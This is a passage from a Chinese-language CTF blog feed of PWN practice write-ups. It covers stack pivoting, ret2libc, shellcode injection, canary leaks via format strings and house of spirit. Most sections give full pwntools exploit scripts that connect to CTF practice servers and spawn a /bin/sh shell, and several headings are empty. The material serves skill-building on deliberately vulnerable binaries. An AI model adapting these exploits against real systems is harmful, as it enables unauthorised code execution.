  <span class="built_in">puts</span>(<span class="string">&quot;GDB-pwndbg maybe useful&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[]=<span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff,buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0=<span class="number">1</span>;</span><br><span class="line">    srand(v0);</span><br><span class="line">    enccrypt(buff);</span><br><span class="line">    read(<span class="number">0</span>,test,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buff,test,<span class="number">30</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Oh No!You lose!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>该题程序就是将<code>Ayaka_nbbbbbbbbbbbbbbbbb_pluss</code>这个字符串进行加密，让我们输入数据，然后与加密过后的数据进行比较，如果与加密后的结果一致，那么就可以<code>getshell</code>，这里先使用<code>IDA</code>逆向一下该二进制程序，找到main函数中<code>call read</code>的地址。以及找到全局变量<code>buff</code>的地址。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116112840731.png" alt="image-20250116112840731"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116112950344.png" alt="image-20250116112950344"></p><ul><li>然后使用<code>gdb</code>动态调试，在<code>call read</code>这个位置去设置断点，设置完断点后使用<code>c</code>命令</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113100715.png" alt="image-20250116113100715"></p><ul><li>这时我们再查看全局变量<code>buff</code>里面的值，这样我们就可以看到加密后的数据了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113225888.png" alt="image-20250116113225888"></p><ul><li>这样我们就可以编写exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27273</span>)</span><br><span class="line">payload = p64(<span class="number">0x144678aadc0e4072</span>) + p64(<span class="number">0x84b6e81a4c7eb0e2</span>)</span><br><span class="line">payload+= p64(<span class="number">0xf426588abcee2052</span>) + p64(<span class="number">0xc8cb2c5e90c2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113535351.png" alt="image-20250116113535351"></p><h2 id="题目8_hdctf-2023keep-on"><a class="markdownIt-Anchor" href="#题目8_hdctf-2023keep-on"></a> 题目8_[HDCTF 2023]KEEP ON</h2><ul><li><p>考点：<code>栈迁移</code></p></li><li><p>拿到附件先查看一下保护机制，发现保护机制没有开Canary和PIE</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093552741.png" alt="image-20250118093552741"></p><ul><li>然后使用<code>IDA</code>反编译查看代码，先来查看<code>main</code>函数，发现<code>main</code>函数只有一个输出，和初始化，比较重要的在<code>vuln</code>这个函数中</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093641878.png" alt="image-20250118093641878"></p><ul><li>接下来直接查看<code>vuln</code>这个函数<ul><li>发现有两个<code>read()</code>函数，其中第二个<code>read</code>函数存在溢出，可以溢出<code>0x10</code>个字节。</li><li>然后<code>printf(s)</code>这边还存在字符串格式化漏洞</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093735268.png" alt="image-20250118093735268"></p><ul><li>由于可以溢出的空间太小了，所以查看汇编代码，看看是否有<code>leave</code> 和<code> ret</code>这个汇编语句。发现有<code>leave</code>和<code>ret</code>这个汇编语句，这样我们就可以进行栈迁移操作。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118094039753.png" alt="image-20250118094039753"></p><ul><li><p>思路就是：先利用字符串格式化漏洞泄露栈地址，并计算偏移，这样在第二次输入时，在没溢出之前就可以构造rop链，使用栈迁移，将<code>rsp</code>指针回到保存<code>s</code>的变量中，这样我们就可以成功构造rop链。</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28694)</span></span><br><span class="line">p = process(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;%16$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name: \n&#x27;</span>,payload)</span><br><span class="line">stack = p.recvline()[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">stack = <span class="built_in">int</span>(stack,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack----&gt;&#x27;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">stack = stack - <span class="number">0x60</span></span><br><span class="line">leave = <span class="number">0x4007F2</span></span><br><span class="line">pop_rdi =<span class="number">0x4008d3</span></span><br><span class="line">sys_addr = <span class="number">0x40085D</span></span><br><span class="line">ret = <span class="number">0x400864</span></span><br><span class="line">payload1 = p64(stack)+p64(pop_rdi)+p64(stack+<span class="number">0x20</span>)+p64(sys_addr)</span><br><span class="line">payload1 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload1 += p64(stack)+p64(leave)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;keep on !\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h1><h2 id="第一页"><a class="markdownIt-Anchor" href="#第一页"></a> 第一页</h2><h2 id="第二页"><a class="markdownIt-Anchor" href="#第二页"></a> 第二页</h2><h3 id="题目1_ez_pz_hackover_2016"><a class="markdownIt-Anchor" href="#题目1_ez_pz_hackover_2016"></a> 题目1_ez_pz_hackover_2016</h3><ul><li><p>考点：<code>栈溢出</code>、<code>shellcode</code></p></li><li><p>先查看一下保护机制，保护机制，发现是32位的程序，并且很多保护机制都没有开。</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219131730677.png" alt="image-20250219131730677"></p><ul><li>之后使用IDA pro反编译一下该程序，发现程序会先进行输入输出初始化</li><li>之后就调用两个函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132048373.png" alt="image-20250219132048373"></p><ul><li>接下来就查看<code>header()</code>这个函数,发现这个函数没有任何漏洞点</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132716148.png" alt="image-20250219132716148"></p><ul><li>再看一下<code>chall()</code>,这个函数主要执行的操作为<ul><li>题目先会泄露出<code>s</code>这个数组的地址，即栈上的地址</li><li>向<code>s</code>输入内容这个地方不存在栈溢出</li><li>并且<code>v3</code>这边会查找<code>\n</code>，然后会将<code>\n</code>置<code>\x00</code></li><li>之后会将数组<code>s</code>与<code>crashme</code>进行比较如果两个字符串相等，那么就可以执行<code>vuln</code>这个函数。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132830410.png" alt="image-20250219132830410"></p><ul><li>接下来查看<code>vuln</code>这个函数<ul><li>这个函数会复制<code>0x400</code>字节到<code>dest</code>这个数组中,这个复制的值是从<code>&amp;src</code>注意是保存<code>src</code>地址的栈开始，这边存在栈溢出</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219174305847.png" alt="image-20250219174305847"></p><ul><li>接下来就是栈溢出的利用了。由于栈可执行，直接往栈上写shellcode然后执行即可</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./ez_pz_hackover_2016&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27130</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr.decode(),<span class="number">16</span>)</span><br><span class="line">a = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a---&gt;&#x27;</span>,<span class="built_in">len</span>(a))</span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + cyclic(<span class="number">0x12</span>)</span><br><span class="line">payload += p32(stack_addr-<span class="number">0x1c</span>)+a</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目2_jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#题目2_jarvisoj_level3_x64"></a> 题目2_jarvisoj_level3_x64</h3><ul><li><p>考点<code>ret2libc</code>这边就不多介绍了，简单栈溢出的<code>ret2libc</code>应用</p></li><li><p>漏洞点就在这里：</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219220242286.png" alt="image-20250219220242286"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26355</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4006b1</span></span><br><span class="line">write_addr = <span class="number">0x4004B0</span></span><br><span class="line">write_got = <span class="number">0x600A58</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_addr)+p64(<span class="number">0x4005E6</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">write = p.recv()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#x27;</span>,write)</span><br><span class="line">write = <span class="built_in">int</span>.from_bytes(write,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = write - <span class="number">0xF72B0</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x18CD57</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目3_mrctf2020_shellcode"><a class="markdownIt-Anchor" href="#题目3_mrctf2020_shellcode"></a> 题目3_mrctf2020_shellcode</h3><ul><li><p>考点<code>ret2shellcode</code></p></li><li><p>简单的<code>ret2shellcode</code>，附件都不用看直接打，模版题。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27597</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目4_bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#题目4_bjdctf_2020_babyrop2"></a> 题目4_bjdctf_2020_babyrop2</h3><ul><li>考点：<code>ret2libc</code>、<code>格式化字符串漏洞</code>、<code>canary保护</code></li><li>查看一下该附件的保护机制</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104016791.png" alt="image-20250220104016791"></p><ul><li>开了Canary，程序中有格式化字符串漏洞，先要利用该漏洞就可以泄露<code>canary</code>了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104831301.png" alt="image-20250220104831301"></p><ul><li>现在就可以直接<code>ret2libc</code>了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104852523.png" alt="image-20250220104852523"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28015</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">canary = p.recvuntil(<span class="string">b&#x27;I\&#x27;ll give u some gift to help u!\n&#x27;</span>)</span><br><span class="line">canary = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary--&gt;&#x27;</span>,canary)</span><br><span class="line">canary = <span class="built_in">int</span>(canary.decode(),<span class="number">16</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400993</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x400610</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x400887</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x6F690</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x18CD57</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)</span><br><span class="line">payload += p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目5_babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#题目5_babyheap_0ctf_2017"></a> 题目5_babyheap_0ctf_2017</h3><ul><li>考点：</li></ul><h3 id="题目6_bjdctf_2020_router"><a class="markdownIt-Anchor" href="#题目6_bjdctf_2020_router"></a> 题目6_bjdctf_2020_router</h3><h2 id="第三页"><a class="markdownIt-Anchor" href="#第三页"></a> 第三页</h2><h2 id="第四页"><a class="markdownIt-Anchor" href="#第四页"></a> 第四页</h2><h3 id="题目13_ciscn_2019_sw_1"><a class="markdownIt-Anchor" href="#题目13_ciscn_2019_sw_1"></a> 题目13_ciscn_2019_sw_1</h3><ul><li>考点：<code>只能一次格式化字符串</code></li><li>这题之后再来归纳一下格式化字符串漏洞，这题再细讲</li><li>这边也直接贴出exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25550</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_sw_1&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">fini_addr = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">sys_addr = <span class="number">0x80483D0</span></span><br><span class="line">printf_got = <span class="number">0x804989C</span></span><br><span class="line"><span class="comment"># 0x8534</span></span><br><span class="line"><span class="comment"># 0x804   0x83D0</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x83d0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83D0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x82D0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hnaaa&#x27;</span></span><br><span class="line">payload += p32(printf_got)+p32(fini_addr)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload+= b&#x27;%&#x27;+str(0x804).encode(&#x27;utf-8&#x27;)+b&#x27;c%14$hnaaaaaaa&#x27;</span></span><br><span class="line"><span class="comment">#payload+= p32(fini_addr)+p32(fini_addr+2)</span></span><br><span class="line"><span class="comment">#payload= fmtstr_payload(4,&#123;printf_got : sys_addr&#125;)</span></span><br><span class="line"><span class="comment">#payload += b&#x27;%&#x27; + str(0x8534).encode(&#x27;utf-8&#x27;) +</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len---&gt;&#x27;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#payload = fmtstr_payload(4,&#123;&#125;)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目14_lctf2016_pwn200"><a class="markdownIt-Anchor" href="#题目14_lctf2016_pwn200"></a> 题目14_lctf2016_pwn200</h3><ul><li>考点：<code>house_of_sprirt</code></li><li>这题在<code>house_of_sprirt</code>这边有详细解答，这边就直接给exp。</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(b&#x27;node5.buuoj.cn&#x27;,25055)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400B1F\n b *0x400824\nb *0x400A5F\n b *0x40092C&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;who are u?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;faaaaaaa&#x27;</span>)</span><br><span class="line">stack_addr = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr=stack_addr[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr-------&gt;&#x27;</span>,stack_addr)</span><br><span class="line">stack_addr=<span class="built_in">int</span>.from_bytes(stack_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ptr = stack_addr-<span class="number">0xf0</span>+<span class="number">0x40</span></span><br><span class="line">payload1 = <span class="string">b&#x27;48&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>,payload1)</span><br><span class="line"><span class="comment"># payload2构造fake_chunk</span></span><br><span class="line">payload2 = p64(<span class="number">0x0</span>)+p64(<span class="number">0x61</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ptr)</span><br><span class="line"><span class="comment">#payload2 = b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa&#x27;#aaaahaaaaaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload3)</span><br><span class="line">payload4 = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload4)</span><br><span class="line">payload5 = <span class="string">b&#x27;80&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;how long?\n&#x27;</span>,payload5)</span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rax,59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sh = a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------&gt;&quot;</span>,<span class="built_in">len</span>(sh))</span><br><span class="line">payload6 = sh +<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me more money :&#x27;</span>,payload6)</span><br><span class="line">payload = <span class="string">b&#x27;3&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目29_houseoforange_hitcon_2016"><a class="markdownIt-Anchor" href="#题目29_houseoforange_hitcon_2016"></a> 题目29_houseoforange_hitcon_2016</h3><ul><li><p>考点：<code>house of orange</code></p></li><li><p>这题也在<code>house_of_orange</code>中有具体分析，这边也直接贴出exp</p></li><li><p>exp如下：</p></li></ul><h2 id="第五页"><a class="markdownIt-Anchor" href="#第五页"></a> 第五页</h2><h3 id="题目28_ogeek2019-finalovm"><a class="markdownIt-Anchor" href="#题目28_ogeek2019-finalovm"></a> 题目28_[OGeek2019 Final]OVM</h3><ul><li></li></ul><h1 id="ctfshow"><a class="markdownIt-Anchor" href="#ctfshow"></a> CTFshow</h1><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="chrome-v8"><a class="markdownIt-Anchor" href="#chrome-v8"></a> chrome v8</h2>]]></content>
    
    
    <summary type="html">前言：弱鸡pwn手刷题成长</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house of orange</title>
    <link href="http://iyheart.github.io/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/"/>
